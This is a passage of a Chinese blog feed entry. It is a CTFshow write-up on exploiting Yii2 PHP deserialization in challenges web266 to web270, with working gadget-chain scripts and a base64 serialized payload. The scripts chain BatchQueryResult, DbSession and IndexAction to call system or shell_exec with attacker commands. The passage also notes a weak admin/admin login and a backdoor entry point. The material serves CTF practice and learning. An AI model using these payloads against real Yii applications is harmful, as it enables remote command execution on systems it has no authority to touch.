-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111531.png&#34; alt=&#34;image-20230310011105476&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;call_user_func 这个函数中的参数也是可控的&lt;/p&gt;
-&lt;p&gt;pop:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;yii\db\BatchQueryResult::__destruct()-&amp;gt;reset()-&amp;gt;close()
-↓↓↓
-yii\web\DbSession::close()-&amp;gt;composeFields()-&amp;gt;call_user_func()
-↓↓↓
-yii\rest\IndexAction::run()-&amp;gt;call_user_func()
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-namespace yii\rest&amp;#123;
-    class IndexAction&amp;#123;
-        public $checkAccess=&amp;quot;system&amp;quot;;
-        public $id=&amp;quot;ping www.baidu.com&amp;quot;;
-    &amp;#125;
-&amp;#125;
-
-namespace yii\web&amp;#123;
-    use yii\rest\IndexAction;
-    class DbSession&amp;#123;
-        public $writeCallback;
-        public function __construct()&amp;#123;
-            $this-&amp;gt;writeCallback = [new IndexAction(),&#39;run&#39;];
-        &amp;#125;
-        
-    &amp;#125;
-&amp;#125;
-
-namespace yii\db&amp;#123;
-    use yii\web\DbSession;
-
-    class BatchQueryResult&amp;#123;
-        private $_dataReader;
-        public function __construct()
-        &amp;#123;
-            $this-&amp;gt;_dataReader = new DbSession();
-        &amp;#125;
-    &amp;#125;
-
-&amp;#125;
-
-namespace &amp;#123;
-    use yii\db\BatchQueryResult;
-    echo base64_encode(serialize(new BatchQueryResult()));
-&amp;#125;
-//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6MTg6InBpbmcgd3d3LmJhaWR1LmNvbSI7fWk6MTtzOjM6InJ1biI7fX19
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100126159.png&#34; alt=&#34;image-20230310012647055&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;也是测试成功&lt;/p&gt;
-&lt;h2 id=&#34;web267&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web267&#34;&gt;#&lt;/a&gt; web267&lt;/h2&gt;
-&lt;p&gt;这里存在弱口令，admin、admin&lt;/p&gt;
-&lt;p&gt;登录后在 about 的源码中有提示&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100959022.png&#34; alt=&#34;image-20230310095940986&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;get 传入 view-source&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101000342.png&#34; alt=&#34;image-20230310100033303&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里找到了反序列化的入口，用上面的 poc 直接打就行（这里入口 r=backdoor/shell）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101003194.png&#34; alt=&#34;image-20230310100348135&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web268-270&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web268-270&#34;&gt;#&lt;/a&gt; web268-270&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-namespace yii\rest &amp;#123;
-    class Action
-    &amp;#123;
-        public $checkAccess;
-    &amp;#125;
-    class IndexAction
-    &amp;#123;
-        public function __construct($func, $param)
-        &amp;#123;
-            $this-&amp;gt;checkAccess = $func;
-            $this-&amp;gt;id = $param;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-namespace yii\web &amp;#123;
-    abstract class MultiFieldSession
-    &amp;#123;
-        public $writeCallback;
-    &amp;#125;
-    class DbSession extends MultiFieldSession
-    &amp;#123;
-        public function __construct($func, $param)
-        &amp;#123;
-            $this-&amp;gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &amp;quot;run&amp;quot;];
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-namespace yii\db &amp;#123;
-    use yii\base\BaseObject;
-    class BatchQueryResult
-    &amp;#123;
-        private $_dataReader;
-        public function __construct($func, $param)
-        &amp;#123;
-            $this-&amp;gt;_dataReader = new \yii\web\DbSession($func, $param);
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-namespace &amp;#123;
-    $exp = new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#39;cp /f* 1.txt&#39;); //此处写命令
-    echo(base64_encode(serialize($exp)));
-&amp;#125;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;换一个链子就行&lt;/p&gt;
-</content>
-        <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
-        <category term="yii反序列化" scheme="https://blog.xcu.icu/tags/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
-        <updated>2023-03-11T04:00:00.000Z</updated>
     </entry>
 </feed>
